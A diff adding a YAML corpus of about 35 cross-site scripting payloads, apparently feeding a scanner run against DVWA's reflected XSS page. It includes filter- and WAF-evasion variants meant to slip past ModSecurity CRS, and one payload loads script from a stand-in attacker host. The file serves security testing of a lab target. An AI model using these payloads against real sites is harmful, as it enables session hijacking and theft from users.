@@ -1,0 +1,269 @@
+# XSS payloads — 25 entries (prompt.md §6: XSS ≥25).
+# Sources: PayloadsAllTheThings/XSS, OWASP XSS filter evasion cheat-sheet,
+# SecLists, Gareth Heyes / PortSwigger polyglot sets, HTML5 security cheat-sheet.
+#
+# DVWA /vulnerabilities/xss_r/?name=<payload> reflects into
+# <pre>Hello <name></pre>, so "reflected" trigger fires if the marker
+# round-trips unchanged.
+
+# ---- script-tag (5) ----
+- id: xss-script-001
+  class: xss
+  payload: "<script>alert(1)</script>"
+  trigger: { kind: reflected, marker: "<script>alert(1)</script>" }
+  cwe: CWE-79
+  source: "PayloadsAllTheThings/XSS — baseline"
+
+- id: xss-script-002
+  class: xss
+  payload: "<script src=//evil.example.com/x.js></script>"
+  trigger: { kind: reflected, marker: "<script src" }
+  cwe: CWE-79
+  source: "OWASP Filter Evasion Cheat Sheet"
+
+- id: xss-script-003
+  class: xss
+  payload: "<ScRipT>alert(1)</ScRipT>"
+  trigger: { kind: reflected, marker: "alert(1)" }
+  cwe: CWE-79
+  source: "PayloadsAllTheThings/XSS — case-mix"
+
+- id: xss-script-004
+  class: xss
+  payload: "<script>confirm`1`</script>"
+  trigger: { kind: reflected, marker: "confirm`1`" }
+  cwe: CWE-79
+  source: "HTML5 security cheat-sheet — tagged template"
+
+- id: xss-script-005
+  class: xss
+  payload: "<script>window['al'+'ert'](1)</script>"
+  trigger: { kind: reflected, marker: "window['al'+'ert']" }
+  cwe: CWE-79
+  source: "PayloadsAllTheThings — dynamic dispatch"
+
+# ---- event handler (5) ----
+- id: xss-img-001
+  class: xss
+  payload: "<img src=x onerror=alert(1)>"
+  trigger: { kind: reflected, marker: "onerror=alert(1)" }
+  cwe: CWE-79
+  source: "OWASP XSS Filter Evasion Cheat Sheet"
+
+- id: xss-svg-001
+  class: xss
+  payload: "<svg onload=alert(1)>"
+  trigger: { kind: reflected, marker: "onload=alert(1)" }
+  cwe: CWE-79
+  source: "SecLists/Fuzzing/XSS/XSS-Polyglot.txt"
+
+- id: xss-body-001
+  class: xss
+  payload: "<body onload=alert('xss')>"
+  trigger: { kind: reflected, marker: "onload=alert" }
+  cwe: CWE-79
+  source: "PayloadsAllTheThings/XSS Injection/README.md"
+
+- id: xss-input-001
+  class: xss
+  payload: "<input autofocus onfocus=alert(1)>"
+  trigger: { kind: reflected, marker: "onfocus=alert" }
+  cwe: CWE-79
+  source: "HTML5 security cheat-sheet — autofocus"
+
+- id: xss-details-001
+  class: xss
+  payload: "<details open ontoggle=alert(1)>"
+  trigger: { kind: reflected, marker: "ontoggle=alert" }
+  cwe: CWE-79
+  source: "Masato Kinugawa HTML5 security cheat-sheet"
+
+# ---- attribute context (5) ----
+- id: xss-attr-001
+  class: xss
+  payload: "\" onmouseover=alert(1) x=\""
+  trigger: { kind: reflected, marker: "onmouseover=alert" }
+  cwe: CWE-79
+  source: "OWASP WSTG v4.2 §4.7.1"
+
+- id: xss-attr-002
+  class: xss
+  payload: "' autofocus onfocus=alert(1) x='"
+  trigger: { kind: reflected, marker: "onfocus=alert" }
+  cwe: CWE-79
+  source: "HTML5 security cheat-sheet — attr break"
+
+- id: xss-js-uri-001
+  class: xss
+  payload: "<a href=\"javascript:alert(1)\">x</a>"
+  trigger: { kind: reflected, marker: "javascript:alert" }
+  cwe: CWE-79
+  source: "OWASP cheat-sheet — javascript: URI"
+
+- id: xss-iframe-001
+  class: xss
+  payload: "<iframe src=javascript:alert(1)>"
+  trigger: { kind: reflected, marker: "src=javascript:alert" }
+  cwe: CWE-79
+  source: "PayloadsAllTheThings/XSS — iframe JS URI"
+
+- id: xss-math-001
+  class: xss
+  payload: "<math><brute href=javascript:alert(1)>CLICK"
+  trigger: { kind: reflected, marker: "javascript:alert" }
+  cwe: CWE-79
+  source: "SecLists/Fuzzing/XSS/XSS-RSnake.txt"
+
+# ---- DOM / context-juggle (5) ----
+- id: xss-dom-001
+  class: xss
+  payload: "<script>document.location='javascript:alert(1)'</script>"
+  trigger: { kind: reflected, marker: "document.location" }
+  cwe: CWE-79
+  source: "PayloadsAllTheThings/XSS — DOM sink"
+
+- id: xss-dom-002
+  class: xss
+  payload: "<img src=x onerror=\"document.write('xss')\">"
+  trigger: { kind: reflected, marker: "document.write" }
+  cwe: CWE-79
+  source: "PayloadsAllTheThings/XSS — document.write"
+
+- id: xss-dom-003
+  class: xss
+  payload: "<video><source onerror=alert(1)>"
+  trigger: { kind: reflected, marker: "onerror=alert" }
+  cwe: CWE-79
+  source: "HTML5 security cheat-sheet — media error"
+
+- id: xss-dom-004
+  class: xss
+  payload: "<marquee onstart=alert(1)>x</marquee>"
+  trigger: { kind: reflected, marker: "onstart=alert" }
+  cwe: CWE-79
+  source: "SecLists/Fuzzing/XSS — marquee"
+
+- id: xss-dom-005
+  class: xss
+  payload: "<object data=\"javascript:alert(1)\"></object>"
+  trigger: { kind: reflected, marker: "data=\"javascript" }
+  cwe: CWE-79
+  source: "HTML5 security cheat-sheet — object data"
+
+# ---- polyglot / filter-evasion (5) ----
+- id: xss-polyglot-001
+  class: xss
+  payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
+  trigger: { kind: reflected, marker: "oNloAd=alert()" }
+  cwe: CWE-79
+  source: "Gareth Heyes / PortSwigger polyglot"
+
+- id: xss-polyglot-002
+  class: xss
+  payload: "';alert(String.fromCharCode(88,83,83))//'; alert(String.fromCharCode(88,83,83))//"
+  trigger: { kind: reflected, marker: "String.fromCharCode" }
+  cwe: CWE-79
+  source: "PayloadsAllTheThings — RSnake classic"
+
+- id: xss-polyglot-003
+  class: xss
+  payload: "<svg/onload=alert(1)>"
+  trigger: { kind: reflected, marker: "svg/onload" }
+  cwe: CWE-79
+  source: "SecLists — slash-separator compact"
+
+- id: xss-polyglot-004
+  class: xss
+  payload: "<img src=x onerror=\"&#x61;&#x6C;&#x65;&#x72;&#x74;(1)\">"
+  trigger: { kind: reflected, marker: "onerror" }
+  cwe: CWE-79
+  source: "OWASP cheat-sheet — HTML entity keyword"
+
+- id: xss-polyglot-005
+  class: xss
+  payload: "<a href=\"jav&#x09;ascript:alert(1)\">x</a>"
+  trigger: { kind: reflected, marker: "jav&#x09;ascript" }
+  cwe: CWE-79
+  source: "OWASP cheat-sheet — tab-split scheme"
+
+# ==== Phase-7 additions: CRS-defeating tricks ====
+
+# Unicode/UTF escapes inside the tag name or handler — libinjection's tag
+# tokeniser treats these as literal chars post-decode.
+- id: xss-unicode-001
+  class: xss
+  payload: "<marquee onstart=\\u0070\\u0072\\u006f\\u006d\\u0070\\u0074()>x"
+  trigger: { kind: reflected, marker: "onstart" }
+  cwe: CWE-79
+  source: "WAF-Bypass repo — Unicode handler"
+
+- id: xss-unicode-002
+  class: xss
+  payload: "<scr\u0131pt>alert(1)</scr\u0131pt>"        # dotless i
+  trigger: { kind: reflected, marker: "alert(1)" }
+  cwe: CWE-79
+  source: "jlajara — Unicode compatibility XSS"
+
+# HTML-entity variant that preserves intent through CRS tokeniser
+- id: xss-entity-001
+  class: xss
+  payload: "<img src=x &#111;nerror=alert(1)>"
+  trigger: { kind: reflected, marker: "onerror" }
+  cwe: CWE-79
+  source: "OWASP — numeric entity attribute split"
+
+# Null-byte splitter on script tag
+- id: xss-nullbyte-001
+  class: xss
+  payload: "<scri\u0000pt>alert(1)</scri\u0000pt>"
+  trigger: { kind: reflected, marker: "alert(1)" }
+  cwe: CWE-79
+  source: "PayloadsAllTheThings — null byte"
+
+# SVG animate (less-common vector, some CRS versions skip SVG event handlers)
+- id: xss-svg-animate
+  class: xss
+  payload: "<svg><animate attributeName=href values=javascript:alert(1) /></svg>"
+  trigger: { kind: reflected, marker: "animate" }
+  cwe: CWE-79
+  source: "HTML5 security cheat-sheet — SVG animate"
+
+# Base64 data-URI in iframe — often slips past pattern WAFs
+- id: xss-data-b64
+  class: xss
+  payload: "<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==></iframe>"
+  trigger: { kind: reflected, marker: "data:text/html;base64" }
+  cwe: CWE-79
+  source: "WAF-Bypass repo — data URI"
+
+# CSS expression leak (older IE vector, still in many corpora)
+- id: xss-css-001
+  class: xss
+  payload: "<style>@import'javascript:alert(1)';</style>"
+  trigger: { kind: reflected, marker: "@import" }
+  cwe: CWE-79
+  source: "OWASP — CSS @import XSS"
+
+# Template-style with mixed quotes
+- id: xss-template-001
+  class: xss
+  payload: "<img src=`x`onerror=`alert(1)`>"
+  trigger: { kind: reflected, marker: "onerror=" }
+  cwe: CWE-79
+  source: "Gareth Heyes — backtick attribute quotes"
+
+# Protocol-handler obfuscation
+- id: xss-proto-001
+  class: xss
+  payload: "<a href=\"\\tjavascript:alert(1)\">x</a>"    # embedded tab
+  trigger: { kind: reflected, marker: "javascript" }
+  cwe: CWE-79
+  source: "Whitespace-before-proto evasion"
+
+# mXSS-flavoured (re-parse in noscript/textarea)
+- id: xss-mxss-001
+  class: xss
+  payload: "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
+  trigger: { kind: reflected, marker: "onerror=alert(1)" }
+  cwe: CWE-79
+  source: "Cure53 mXSS catalogue"
